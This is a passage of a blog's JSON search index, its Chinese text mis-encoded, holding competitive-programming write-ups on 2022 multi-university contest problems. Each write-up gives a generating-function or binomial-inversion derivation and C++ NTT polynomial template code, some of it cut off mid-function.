é¡¹å³å¯ã€‚é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$ [x ^ k]\\prod_{i = 1} ^ {\\text{cnt}} \\sum_{j = 0} ^ {\\lfloor \\frac{S_i}{2} \\rfloor} f_{S_i,j}x^j $$ $\\text{cnt}$ ä¸ºå›¾ä¸­ç¯çš„æ•°é‡ã€‚é‚£ä¹ˆç°åœ¨è€ƒè™‘æ±‚å‡º $f(n, m)$ï¼Œå³å¤§å°ä¸º $n$ çš„ç¯é€‰å‡º $m$ ä¸ªäº’ä¸ç›¸é‚»çš„ç‚¹çš„æ–¹æ¡ˆæ•°ã€‚ æˆ‘ä»¬å…ˆè€ƒè™‘ä¸æ˜¯ç¯çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯é“¾å¼ä¸ç›¸é‚»é—®é¢˜ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæ”¾ $m$ ä¸ªè¢«é€‰æ‹©çš„çƒï¼Œè€ƒè™‘æŠŠä¸­é—´ $m - 1$ ä¸ªç©ºæ”¾ä¸Šä¸€ä¸ªä¸è¢«é€‰æ‹©çš„çƒï¼Œé‚£ä¹ˆå‰©ä¸‹ $n - 2\\times m - 1$ ä¸ªçƒå°±å¯ä»¥éšä¾¿æ”¾ï¼Œé—®é¢˜å°±ç›¸å½“äºæœ‰ $m + 1$ ä¸ªç›’å­ï¼Œæ¯ä¸ªç›’å­å¯ç©ºçš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆå°±æ˜¯ç»å…¸éš”æ¿æ³•ï¼Œæ–¹æ¡ˆæ•°ä¸º $g(n, m) =\\dbinom{n - 2\\times m - 1 + m + 1 - 1}{m + 1 - 1}=\\dbinom{n - m + 1}{m}$ ç°åœ¨è€ƒè™‘æ˜¯ç¯çš„æƒ…å†µï¼Œå‡è®¾å¯¹äºç¯ä¸Šä¸€ä¸ªç‚¹ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œè‹¥è¿™ä¸ªç‚¹è¢«é€‰æ‹©ï¼Œåˆ™è¿™ä¸ªç‚¹çš„ç›¸é‚»ç‚¹ä¸èƒ½è¢«é€‰æ‹©ï¼Œé‚£ä¹ˆå…¶ä»– $n - 3$ ä¸ªç‚¹å°±æ˜¯ $g(n - 3, m - 1)$ï¼Œè‹¥è¿™ä¸ªç‚¹ä¸è¢«é€‰æ‹©ï¼Œé‚£ä¹ˆå‰©ä¸‹ $n - 1$ ä¸ªç‚¹å°±æ˜¯ $g(n - 1, m)$ï¼Œæ‰€ä»¥ $f(n, m) = g(n - 3, m - 1) + g(n - 1, m) = \\dbinom{n - m - 1}{m - 1} + \\dbinom{n - m}{m}$ ","date":"2022-08-03","objectID":"/posts/cp2022-%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-count-set/:0:0","tags":["ç”Ÿæˆå‡½æ•°","åˆ†æ²» NTT"],"title":"[2022 æ­ç”µå¤šæ ¡5] Count Set","uri":"/posts/cp2022-%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-count-set/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = min(5000000, a.size() + b.size() - 1); while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i","date":"2022-08-03","objectID":"/posts/cp2022-%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-count-set/:1:0","tags":["ç”Ÿæˆå‡½æ•°","åˆ†æ²» NTT"],"title":"[2022 æ­ç”µå¤šæ ¡5] Count Set","uri":"/posts/cp2022-%E6%9D%AD%E7%94%B5%E5%A4%9A%E6%A0%A15-count-set/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $w$ åŠ $w$ ä¸ªæ•° $c_0, c_1, \\cdots,c_{w - 1}$ $q$ ç»„è¯¢é—®ï¼Œæ¯æ¬¡è¯¢é—®ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $n$ï¼Œè®¡ç®—æœ‰å¤šå°‘ä¸ªé•¿åº¦ä¸º $n$ çš„å­—ç¬¦ä¸²æ»¡è¶³ï¼š æ¯ä¸ªå­—ç¬¦åªèƒ½å–æ•°å­— $0 \\sim w - 1$ æ•°å­— $i$ è‡³å°‘å‡ºç° $c_i$ æ¬¡ å¯¹ $998 , 244 , 353$ å–æ¨¡ã€‚ $2 \\le w \\le 10, 1 \\le c_i \\le 5 \\times 10 ^ 4, \\sum\\limits_{i = 0} ^ {w - 1}c_i \\le 5 \\times 10 ^ 4$ $1 \\le q \\le 300, 1 \\le n \\le 10 ^ 7$ åˆ†æï¼š é¦–å…ˆæˆ‘ä»¬å¯ä»¥å†™å‡ºæ¯ä¸ªæ•°å­— $i$ çš„ $\\textbf{EGF}$ $$ \\sum_{j = c_i} ^ {\\infty} \\frac{x ^ j}{j!} $$ é‚£ä¹ˆæ¯ä¸ªæ•°å­—çš„ $\\textbf{EGF}$ åšä¹˜ç§¯è¡¨ç¤ºæ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰é•¿åº¦çš„å­—ç¬¦ä¸²çš„æ–¹æ¡ˆæ•° $$ \\prod_{i = 0} ^ {w - 1}\\sum_{j = c_i} ^ {\\infty} \\frac{x ^ j}{j!} $$ å¯ä»¥æŠŠå’Œå¼ç”¨å‰ç¼€å’Œç›¸å‡æ‹†ä¸€ä¸‹ $\\sum\\limits_{j = c_i} ^ {\\infty} \\dfrac{x ^ j}{j!} = \\sum\\limits_{j = 0} ^ {\\infty} \\dfrac{x ^ j}{j!} - \\sum\\limits_{j = 0} ^ {c_i - 1} \\dfrac{x ^ j}{j!}$ï¼Œå‘ç°ç¬¬ä¸€é¡¹ä¸º $e ^ x$ï¼Œæ•…ç­”æ¡ˆä¸º $$ \\prod_{i = 0} ^ {w - 1}(e ^ x - \\sum_{j = 0} ^ {c_i - 1} \\frac{x ^ j}{j!}) $$ ç”±äº $w \\le 10$ï¼Œæ‰€ä»¥è€ƒè™‘æš´åŠ›å±•å¼€å¼å­ï¼Œåšæ¢å…ƒ $e ^ x \\rightarrow y$ åœ¨å±•å¼€å¼å­çš„è¿‡ç¨‹ä¸­ï¼Œå‡è®¾å½“å‰çš„å¤šé¡¹å¼ä¸º $f = A_0 + A_1 y + A_2y ^ 2 + A_3y^3 + \\cdots$ï¼Œé‚£ä¹ˆæ–°é‡åˆ°ä¸€ä¸ªå¤šé¡¹å¼ $(y + g_i)$ å…¶ä¸­ $g_i = -\\sum\\limits_{j = 0} ^ {c_i - 1} \\dfrac{x ^ j}{j!}$ï¼Œ åˆ™ç»“æœå˜ä¸º $f * y + f * g_i$ ($*$ è¡¨ç¤ºå¤šé¡¹å¼å·ç§¯)ï¼Œå‰ä¸€é¡¹ä¸º $A_0y + A_1 y ^ 2 + A_2y ^ 3 + A_3y^4 + \\cdots$ï¼Œé‚£ä¹ˆåä¸€é¡¹æ˜¯ $f$ çš„æ¯ä¸€é¡¹ç³»æ•°ä¸ $g_i$ çš„å¤šé¡¹å¼å·ç§¯ï¼Œä¸º $A_0 * g_i + (A_1 * g_i) y + (A_2 * g_i)y ^ 2 + (A_3 * g_i)y^3 + \\cdots$ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$ A_0 * g_i + (A_0 + A_1 * g_i)y + (A_1 + A_2 * g_i)y ^ 2 + (A_2 + A_3 * g_i)y ^ 3 + \\cdots $$ è¿™æ ·å°±é¢„å¤„ç†å¥½äº†æ€»ç­”æ¡ˆï¼Œç°è€ƒè™‘å›ç­”æ¯ç»„è¯¢é—®ï¼Œæˆ‘ä»¬çŸ¥é“æœ€åçš„ç­”æ¡ˆæ˜¯å½¢å¦‚ $\\sum\\limits_{i = 0} ^ {w - 1} e ^ {ix} F_i(x)$ çš„å¤šé¡¹å¼ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æ¯ä¸€é¡¹çš„ç¬¬ $n$ é¡¹ç³»æ•°ï¼Œç”±äº $\\sum\\limits_{i = 0} ^ {w - 1}c_i \\le 5 \\times 10 ^ 4$ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯¢é—®é‡Œå¯¹äºæ¯ä¸ª $i$ ç›´æ¥æšä¸¾ $F_i(x)$ çš„é¡¹æ•°ï¼Œè®¾å½“å‰æšä¸¾åˆ°äº†ç¬¬ $j$ é¡¹ï¼Œé‚£ä¹ˆéœ€è¦åœ¨ $e ^ {ix}$ ä¸­å–å‡ºç¬¬ $n - j$ é¡¹ï¼Œä¹Ÿå°±æ˜¯ $e ^ {ix} = 1 + \\dfrac{(ix) ^ 1}{1!} + \\dfrac{(ix) ^ 2}{2!} + \\dfrac{(ix) ^ 3}{3!} + \\cdots$ çš„ç¬¬ $n - j$ é¡¹ï¼Œä¸º $\\dfrac{i ^ {n - j}}{(n - j)!}$ é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$ n! \\times \\sum_{i = 0} ^ {w} \\sum_{j = 0} ^ {\\min(n, |F_i(x)|)} [x ^ j] F_i(x) \\times \\frac{i ^ {n - j}}{(n - j)!} $$ ","date":"2022-08-01","objectID":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A14-c-easy-counting-problem/:0:0","tags":["ç”Ÿæˆå‡½æ•°","NTT"],"title":"[2022 ç‰›å®¢å¤šæ ¡4 C] Easy Counting Problem","uri":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A14-c-easy-counting-problem/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-08-01","objectID":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A14-c-easy-counting-problem/:1:0","tags":["ç”Ÿæˆå‡½æ•°","NTT"],"title":"[2022 ç‰›å®¢å¤šæ ¡4 C] Easy Counting Problem","uri":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A14-c-easy-counting-problem/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ å®šä¹‰ $F_{n, k}$ ä¸ºæ‰€æœ‰é•¿åº¦ä¸º $n$ çš„å­—ç¬¦ä¸² $S$ ä¸­æ°å¥½å‡ºç°äº† $k$ æ¬¡ bit çš„ä¸ªæ•°ã€‚ æ±‚ $F_{n, 0},F_{n, 1}, \\cdots,F_{n,n}$ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $(1 \\le n \\le 10 ^ 6)$ åˆ†æï¼š çœ‹åˆ°æ±‚æ°å¥½å‡ºç° $k$ æ¬¡ï¼Œé¦–å…ˆæƒ³åˆ°æ±‚å‡ºå¤§äºç­‰äº $k$ æ¬¡å†è¿›è¡Œå®¹æ–¥ã€‚ è€ƒè™‘é’¦å®šå‡ºç° $k$ æ¬¡ bit çš„å­—ç¬¦ä¸²ï¼Œå°† $k$ ä¸ª bit è¿›è¡Œæ†ç»‘ï¼Œé‚£ä¹ˆæœ‰ $n - 3k + k = n - 2k$ ä¸ªä½ç½®ï¼Œå¹¶ä¸”å‰©ä¸‹ $n - 3 k$ ä¸ªå­—æ¯ä»»æ„å–å€¼ï¼Œä» $n - 2k$ ä¸ªä½ç½®é€‰å‡º $k$ ä¸ªæ”¾ bitï¼Œæ–¹æ¡ˆæ•°ä¸º $\\dbinom{n - 2k}{k} \\times 26 ^ {n - 3k}$ï¼Œè®°ä¸º $f(k)$ é‚£ä¹ˆ $f(k)$ ç”±æ‰€æœ‰æ°å¥½å‡ºç° $k, k + 1, \\cdots, n$ æ¬¡çš„æ–¹æ¡ˆæ•°åŠ èµ·æ¥ï¼Œè¿˜è¦ä¹˜ä¸Šå¯¹åº”æ¬¡æ•°é€‰å‡º $k$ ä¸ªçš„æ–¹æ¡ˆæ•°ï¼Œè®°æ°å¥½å‡ºç° $k$ æ¬¡çš„æ–¹æ¡ˆæ•°ä¸º $g(k)$ $$ f(k) = \\sum_{i = k} ^ {n} \\binom{i}{k} g(i) $$ æ ¹æ®äºŒé¡¹å¼åæ¼”å…¬å¼ $f(n)= \\sum\\limits_{i = n} ^ {m} \\binom{i}{n} g(i) \\Leftrightarrow g(n) = \\sum\\limits_{i = n} ^ {m}(-1) ^ {i - n}\\binom{i}{n}g(i)$ $$ g(k) = \\sum_{i = k} ^ {n} (-1) ^ {i - k} \\binom{i}{k}f(i) $$ å±•å¼€ç»„åˆæ•° $\\dbinom{i}{k}= \\dfrac{i!}{k! \\times (i - k)!}$ $$ g(k) = \\sum_{i = k} ^ {n} i!f(i) \\dfrac{(-1) ^ {i - k}}{k! \\times (i - k)!} \\ \\Leftrightarrow k!g(k) = \\sum_{i = k} ^ {n} i!f(i) \\dfrac{(-1) ^ {i - k}}{(i - k)!} $$ è®¾ $P(k) = k!g(k), F(i) = i!f(i), G(i) = \\dfrac{(-1) ^ {i}}{i!}$ï¼Œåˆ™ $$ P(k) = \\sum_{i = k} ^ {n} F(i) \\times G(i - k) $$ ä»¤ $(i - k) \\rightarrow i$ $$ P(k) = \\sum_{i = 0} ^ {n - k} G(i) \\times F(i + k) $$ è€ƒè™‘å¤šé¡¹å¼åŠ é€Ÿã€‚æˆ‘ä»¬çŸ¥é“å¸¸è§„çš„å¤šé¡¹å¼å·ç§¯æ˜¯ $F(n) = \\sum\\limits_{i = 0} ^ {n} f(i) \\times g(n - i)$ï¼Œæ‰€ä»¥ä¸Šå¼ä¸­ $F$ å¯¹åº”çš„ä¸‹æ ‡åº”ä¸º $n - k - i$ï¼Œå‘ç° $n - k - i + i + k = n$ æ°å¥½æ˜¯å¯¹ç§°å…³ç³»ï¼Œæ‰€ä»¥å¯ä»¥å¯¹ $F$ å‡½æ•°åšç¿»è½¬è¿›è¡Œå¤šé¡¹å¼å·ç§¯ã€‚ ç­”æ¡ˆä¸º $\\dfrac{P(i)}{i!}$ $(0 \\le i \\le n)$ ","date":"2022-07-25","objectID":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A12-e-falfa-with-substring/:0:0","tags":["äºŒé¡¹å¼åæ¼”","NTT"],"title":"[2022 ç‰›å®¢å¤šæ ¡2 E] Falfa with Substring","uri":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A12-e-falfa-with-substring/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-07-25","objectID":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A12-e-falfa-with-substring/:1:0","tags":["äºŒé¡¹å¼åæ¼”","NTT"],"title":"[2022 ç‰›å®¢å¤šæ ¡2 E] Falfa with Substring","uri":"/posts/cp2022-%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A12-e-falfa-with-substring/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‰ç½®ï¼šæ•°å­¦ç¬¦å·ä»‹ç» $\\sum\\limits_{i = 1} ^ {n}$ï¼šæ±‚å’Œç¬¦å·ï¼Œä¾‹å¦‚ $\\sum\\limits_{i = 1} ^ {n}i = \\dfrac{n \\times (n + 1)}{2}$ ä»£è¡¨ $1 + 2 + 3 + 4 + \\cdots + n$ $\\prod\\limits_{i = 1} ^ {n}$ï¼šè¿ä¹˜ç¬¦å·ï¼Œä¾‹å¦‚ $\\prod\\limits_{i = 1} ^ {n} i = n!$ ä»£è¡¨ $1 \\times 2 \\times 3 \\times 4 \\times \\cdots \\times n$ $\\lfloor \\dfrac{x}{y} 